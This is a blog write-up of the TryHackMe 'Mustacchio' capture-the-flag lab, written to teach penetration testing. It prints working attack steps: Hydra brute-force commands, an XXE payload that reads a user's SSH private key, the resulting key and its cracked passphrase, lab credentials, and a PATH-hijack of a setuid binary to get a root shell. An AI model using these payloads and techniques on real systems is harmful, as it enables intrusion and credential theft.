---
title: "Challenges: Mustacchio (TryHackMe)"
datePublished: Wed Aug 13 2025 21:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cmewnprai000b02kz1diu4326
slug: challenges-mustacchio-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1756460201121/fe27302a-a133-4b1f-a2ff-bc888de2af25.png
tags: tryhackme, websecurity, burpsuite, ctf-writeup, privilege-escalation

---

The *Mustacchio* challenge provided a hands-on opportunity to practice real-world penetration testing methodologies, including enumeration, exploitation, and privilege escalation. The target machine hosted multiple services and a custom-built web application, which we systematically enumerated to uncover hidden directories, credentials, and misconfigurations. By leveraging tools such as **Nmap**, **Gobuster**, **Dirsearch**, **Hydra**, and **Burp Suite**, we were able to identify weak points in the application and ultimately escalate our privileges to root. This exercise highlights the importance of proper web application hardening, secure credential storage, and careful handling of system binaries.

`nmap -sV IP_Address`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756457335749/8b07cf85-7309-4fcf-9598-832129680cd2.png align="center")

`nmap -p- -sV IP_Address`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756457285018/2e1cccbf-fe86-42ab-af88-d30dc5eab7e2.png align="center")

`gobuster dir -u IP_Address -w /usr/share/wordlists/dirb/common.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756457864869/b12e53d8-847c-4be2-b35d-5045402cafcb.png align="center")

`gobuster dir -u 10.10.12.252 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756457281348/ba84e850-a6fb-478c-8f07-491461062457.png align="center")

```html

curl -i <http://10.10.12.252>
HTTP/1.1 200 OK
Date: Wed, 13 Aug 2025 09:45:59 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Sat, 12 Jun 2021 15:48:14 GMT
ETag: "6d8-5c4938d5d4e40"
Accept-Ranges: bytes
Content-Length: 1752
Vary: Accept-Encoding
Content-Type: text/html

<!doctype html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Mustacchio | Home</title>
	<link rel="stylesheet" type="text/css" href="custom/css/style.css">
	<link rel="stylesheet" type="text/css" href="custom/css/mobile.css" media="screen and (max-width : 568px)">
	<script type="text/javascript" src="custom/js/mobile.js"></script>
</head>
<body>
	<div id="header">
		<a href="index.html" class="logo">
			<img src="images/logo.jpg" alt="">
		</a>
		<ul id="navigation">
			<li class="selected">
				<a href="index.html">home</a>
			</li>
			<li>
				<a href="about.html">about</a>
			</li>
			<li>
				<a href="gallery.html">gallery</a>
			</li>
			<li>
				<a href="blog.html">blog</a>
			</li>
			<li>
				<a href="contact.html">contact</a>
			</li>
		</ul>
	</div>
	<div id="body">
		<div id="featured">
			<img src="images/the-beacon.jpg" alt="">
			<div>
				<h2>the beacon to all mankind</h2>
				<span>Our website templates are created with</span>
				<span>inspiration, checked for quality and originality</span>
				<span>and meticulously sliced and coded.</span>
				<a href="blog-single-post.html" class="more">read more</a>
			</div>
		</div>
		<ul>
			<li>
				<a href="gallery.html">
					<img src="images/the-father.jpg" alt="">
					<span>the father</span>
				</a>
			</li>
			<li>
				<a href="gallery.html">
					<img src="images/the-actor.jpg" alt="">
					<span>the actor</span>
				</a>
			</li>
			<li>
				<a href="gallery.html">
					<img src="images/the-nerd.jpg" alt="">
					<span>the nerd</span>
				</a>
			</li>
		</ul>
	</div>
	<div id="footer">
		<div>
			<p>&copy; 2023 by Mustacchio. All rights reserved.</p>
		</div>
	</div>
</body>
</html>
```

`dirsearch -u http://10.10.155.104 -e php,html,txt,js -t 50 --recursive`

* Just realized that `gobuster` had already revealed the /custom folder, which was revealed by `dirsearch` too, so I didn’t pay much attention to it further.
    

Visit the site using this path `http://IP_Address/custom`:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756458848416/bc131032-1f2b-4f1c-bab7-a67f409b66b9.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756458608105/575d860d-da3d-44e8-8077-8091351a3147.png align="center")

admin: bulldog19

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756458629332/85f46446-a7af-4bc5-8cee-1c9e1928e96a.png align="center")

---

`gobuster dir -u http://10.10.155.104/custom/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html`

`http://IP_Address:8765`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756458866844/8e33d53a-d1a3-4de1-9921-dd94fe8f8f18.png align="center")

Accessed the site: `http://IP_Address:8765/home.php` via Burp Suite proxy browser. Logged in using the credentials we found in the enumeration stage, then added a random comment and checked back on the HTTP History of Burp Suite, and the response showed some source code which had some hints within code comments and the script code block.

`//document.cookie = "Example=/auth/dontforget.bak";`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756458905047/fc632cee-7a99-4a80-9085-3df58d1822cf.png align="center")

Visited the site on the Firefox browser with this path which was revealed on the previous stage while using Burp Suite. `http://IP_Address:8765/auth/dontforget.bak` This enabled us to download the bak file which we checked it’s details on the next step:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756459091717/9066001f-469d-4dbf-a463-3e4d129d25bb.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756459132020/6fb594f3-ea15-43d8-a284-3d7865538c42.png align="center")

`cat dontforget.bak`

```jsx
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could\\u2019ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could\\u2019ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
root@ip-10-10-106-211:~# 

```

`hydra -l username -P /usr/share/wordlists/rockyou.txt ftp://ip`

`hydra -l barry -P /usr/share/wordlists/rockyou.txt ssh://ip`

`hydra -l joe -P /usr/share/wordlists/rockyou.txt ssh://ip`

Hydra didn’t work

Back to the response on BurpSuite proxy, here’s the full

```jsx
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mustacchio | Admin Page</title>
    <link href="<https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css>" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/css/home.css">
    <script type="text/javascript">
      //document.cookie = "Example=/auth/dontforget.bak"; 
      function checktarea() {
      let tbox = document.getElementById("box").value;
      if (tbox == null || tbox.length == 0) {
        alert("Insert XML Code!")
      }
  }
</script>
</head>
<body>

    <!-- Barry, you can now SSH in using your key!-->

    <img id="folhas" src="assets/imgs/pexels-alexander-tiupa-192136.jpg" alt="">

    <nav class="position-fixed top-0 w-100 m-auto ">
        <ul class="d-flex flex-row align-items-center justify-content-between h-100">
            <li>AdminPanel</li>
            <li class="mt-auto mb-auto"><a href="auth/logout.php">Logout</a></li>
        </ul>
    </nav>

    <section id="add-comment" class="container-fluid d-flex flex-column align-items-center justify-content-center">
        <h3>Add a comment on the website.</h3>

        <form action="" method="post" class="container d-flex flex-column align-items-center justify-content-center">
            <textarea id="box" name="xml" rows="10" cols="50"></textarea><br/>
            <input type="submit" id="sub" onclick="checktarea()" value="Submit"/>
        </form>
        <h3>Comment Preview:</h3><p>Name: </p><p>Author : </p><p>Comment :<br> <p/>    </section>

<script src="<https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js>" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>
</body>
</html>
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756459979021/c49e5123-4b50-46cd-a60f-78ad5e8d1b4f.png align="center")

Visit the site again and log in, then use this XML code as the comment. The output is the key for barry

```xml

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" >
]>
<comment>
  <name>test</name>
  <author>test</author>
  <com>&xxe;</com>
</comment>

```

`nano barry_id_rsa`

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----

```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756460013720/73cee3b3-dd8a-4042-b4c8-009a5155a8ba.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756460066995/f50481e8-8660-4069-8f04-9a2083869b11.png align="center")

`chmod 600 barry_id_rsa`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756460095295/63a8c2bb-a8e7-4d3b-ae98-e45f641144c6.png align="center")

`/opt/john/ssh2john.py barry_id_rsa > barry_hash.txt`

`john --wordlist=/usr/share/wordlists/rockyou.txt barry_hash.txt`

`urieljames (barry_id_rsa)`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756460750240/66806f4a-44df-409e-8be1-09d8ebfeb806.png align="center")

`openssl rsa -in barry_id_rsa -out barry_id_rsa_decrypted`

`chmod 600 barry_id_rsa_decrypted`

`ssh -i barry_id_rsa_decrypted barry@10.10.17.165`

`find / -type f -name user.txt 2>/dev/null`

`cat /home/barry/user.txt`

  
`file /home/joe/live_log`

```bash
/home/joe/live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
```

  
`find / -perm -4000 2>/dev/null`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756460941177/ff7ccbe4-13d8-491a-abd1-d5ab73e6f704.png align="center")

```bash
barry@mustacchio:~$ find / -perm -4000 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
```

```bash
barry@mustacchio:~$ file /home/joe/live_log
/home/joe/live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
barry@mustacchio:~$ strings /home/joe/live_log | grep "/bin"
barry@mustacchio:~$ strings /home/joe/live_log
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8060
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
demo.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

`tail -f /var/log/nginx/access.log` tail: cannot open '/var/log/nginx/access.log' for reading: Permission denied tail: no files remaining `cd /tmp`

`echo -e '#!/bin/bash\\n/bin/bash' > tail`

`chmod +x tail`

`export PATH=/tmp:$PATH`

`/home/joe/live_log`

`find / -type f -name root.txt 2>/dev/null`

`cat /root/root.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756460987850/7e83d1d7-3c5d-491b-8e1f-9f69ade71a42.png align="center")

Through structured enumeration and exploitation, we gained access to the target system and escalated privileges to root. The key vulnerabilities discovered included exposed directories, weakly protected admin credentials, an XML External Entity (XXE) injection vulnerability, and an unsafe setuid binary (`live_log`) that allowed privilege escalation. Each step reinforced critical penetration testing skills, from reconnaissance to post-exploitation. Overall, the challenge demonstrated how small misconfigurations and insecure coding practices can be chained together to achieve full system compromise, underscoring the need for a **defense-in-depth approach** to web and host security.